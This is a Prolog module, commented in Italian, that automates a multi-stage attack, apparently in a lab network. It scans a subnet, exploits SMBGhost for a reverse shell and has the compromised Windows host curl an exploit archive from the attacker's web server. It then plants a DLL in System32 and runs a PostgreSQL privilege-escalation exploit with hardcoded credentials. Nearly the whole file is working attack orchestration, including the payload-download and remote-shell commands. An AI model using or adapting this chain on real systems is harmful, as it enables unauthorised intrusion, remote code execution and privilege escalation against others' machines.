/** <poc1> Implementazione della POC1
 *
 *  Questo modulo introduce diversi predicati di utilità 
 *  per l'implementazione della POC1.
 *  Fase 1
 *  - Creazione di un reverse listener sulla porta 80 sulla
 *	macchina dell'attaccante 10.1.146.120.
 *  - Creazione di un Web server sulla porta 5555.
 *  - Exploit SMBGhost su 10.1.146.111 e ottenimento di una
 *	reverse shell.
 *  Fase 2
 *  - Creazione della directory C:\Users\user\Desktop\postgres.
 *  - Scaricamento dell'archivio exploit_LPE_OPC.zip tramite
 *	curl (eseguito da 10.1.146.111). Il Web server che riceve
 *	la richiesta di curl è quello fatto partire in Fase 1.
 *  Fase 3
 *  - Ingresso nella directory C:\Users\user\Desktop\postgres.
 *  - Spacchettamento di exploit_LPE_OPC.zip tramite tar.exe.
 *  - Copia del file vcruntime140.dll in C:\Windows\System32\.
 *  - Esecuzione del comando seguente:
 *	exploit.exe 10.1.146.11 postgres .1q2w3e! 5432
 *
 *  @author Mauro Andreolini
 *  @version 0.1
 */
:- module(poc1, [
		run_poc1/0
]).

:- use_module(scanner/nmap_scanner).
:- use_module(auxiliary/shell).
:- use_module(auxiliary/http_server).
:- use_module(exploits/smb_ghost).
:- use_module(utils/command_runner).

:- dynamic running_reverse_shell/3.

% Parametri dell'attaccante
attacker_username("kali").
attacker_password("kali").
attacker_ip("10.1.146.120").
reverse_listener_port(80).
reverse_pipe_in("/tmp/in").
reverse_pipe_out("/tmp/out").
http_server_port(5555).
http_server_directory("/home/kali/working_directory/1.PostgreSQL/").

% Funzioni di appoggio (da spostare nei moduli)

% Estrae IP vulnerabile in base alla porta SMB + check_vuln/2
find_vulnerable_host(Hosts, TCPServices, VulnIP) :-
	member((_Hostname, VulnIP), Hosts),
	member((VulnIP, "tcp", Port, "microsoft-ds", _), TCPServices),
	smb_ghost:check_vuln(VulnIP, Port), !.

% Legge tutto l'output disponibile dalla pipe
read_pipe_output(Stream, Output) :-
	read_string(Stream, 1024, Output),
	!.
read_pipe_output(_, "").

% Scrive comandi e legge l'output tramtie il listener
%write_command(Cmd, Output) :-
%	reverse_pipe_in(InPipe),
%	reverse_pipe_out(OutPipe),
%%	open(InPipe, write, InStream),
%%	format(InStream, "~w~n", [Cmd]),
%%	flush_output(InStream),
%%	open(OutPipe, read, OutStream),
%%	read_pipe_output(OutStream, Output).
%	setup_call_cleanup(
%		open(InPipe, write, InStream),
%		format(InStream, "~w~n", [Cmd]),
%		close(InStream)
%	),
%	setup_call_cleanup(
%		open(OutPipe, read, OutStream),
%		read_pipe_output(OutStream, Output),
%		close(OutStream)
%	).
write_command(Command, Response) :-
    % Open the input pipe for writing the command
    open('/tmp/in', write, InStream),
    format(InStream, '~w~n', [Command]),
    flush_output(InStream),
    close(InStream),

    % Open the output pipe for reading the response
    open('/tmp/out', read, OutStream),

    % Wait up to 5 seconds for data to become available
    Timeout = 5.0,
    (   wait_for_input([OutStream], ReadyStreams, Timeout),
        ReadyStreams \= []
    ->  read_line_to_string(OutStream, Response)
    ;   Response = timeout
    ),

    close(OutStream).

% Termina i servizi avviati
cleanup :-
	format("[*] Cleanup: chiusura reverse shell e Web server~n", []),
	reverse_listener_port(ListenerPort),
	http_server_port(HttpPort),
	stop_reverse_listener(ListenerPort),
	stop_http_server(HttpPort).

% Fase 0: scansione della rete, parsing e identificazione
% macchina vulnerabile
fase0(VulnHost) :-
	format("[*] Fase 0: scansione della rete~n", []),
	Target = "10.1.146.0/24",
	attacker_username(Username),
	attacker_password(Password),
	%scan_target(Target, XMLText, Username, Password),
        read_file_to_string("test/full-scan.xml", XMLText, []),
	parse_nmap_xml(XMLText, Hosts, TCPServices, _KernelGuesses),
	find_vulnerable_host(Hosts, TCPServices, VulnHost),
	format("[+] Scansione completata. Verifica vulnerabilità SMBGhost...~n", []).

% Fase 1: avvio listener, web server, exploit SMBGhost su
% VulnHost
fase1(VulnHost) :-
	format("[*] Fase 1: avvio servizi e sfruttamento SMBGhost su ~w~n", [VulnHost]),
	reverse_listener_port(ListenerPort),
	reverse_pipe_in(ReverseIn),
	reverse_pipe_out(ReverseOut),
	http_server_port(HttpPort),
	http_server_directory(HttpDirectory),
	start_reverse_listener(ListenerPort, ReverseIn, ReverseOut),
	start_http_server(HttpPort, HttpDirectory),
	smb_ghost:exploit(VulnHost, 445).

% Fase 2: creazione directory e scaricamento archivio
fase2 :-
	format("[*] Fase 2: caricamento archivio su macchina compromessa~n", []),
	write_command("mkdir \"C:\\Users\\user\\Desktop\\postgres\"", Output1),
	write_command("curl http://10.1.146.120:5555/exploit_LPE_OPC.zip -o \"C:\\Users\\user\\Desktop\\postgres\\exploit_LPE_OPC.zip\"", Output2),
	writeln(Output1),
	writeln(Output2).

% Fase 3: spacchettamento ed esecuzione exploit PostgreSQL
fase3 :-
	format("[*] Fase 3: unpacking ed esecuzione finale~n", []),
	write_command("cd \"C:\\Users\\user\\Desktop\\postgres\"", _),
	write_command("tar.exe -xf exploit_LPE_OPC.zip", _),
	sleep(5),
	write_command("copy vcruntime140.dll C:\\Windows\\System32\\", _),
	write_command("exploit.exe 10.1.146.11 postgres .1q2w3e! 5432", _).

% Esecuzione della POC1
%run_poc1 :-
%	catch(
%		(
%			set_sudo_credentials(attacker_username, attacker_password),
%			fase0(VulnHost),
%			writeln(VulnHost)
%			%fase1(VulnHost),
%			%sleep(10),
%			%fase2,
%			%sleep(5),
%			%fase3
%		),
%		Error,
%		format("[!] Errore durante l'esecuzione: ~w~n", [Error])
%	),
%	cleanup.
run_poc1 :-
	fase0(VulnHost),
	writeln(VulnHost),
	fase1(VulnHost),
	sleep(5),
	fase2,
	sleep(5),
	fase3,
	%cleanup,
	true.
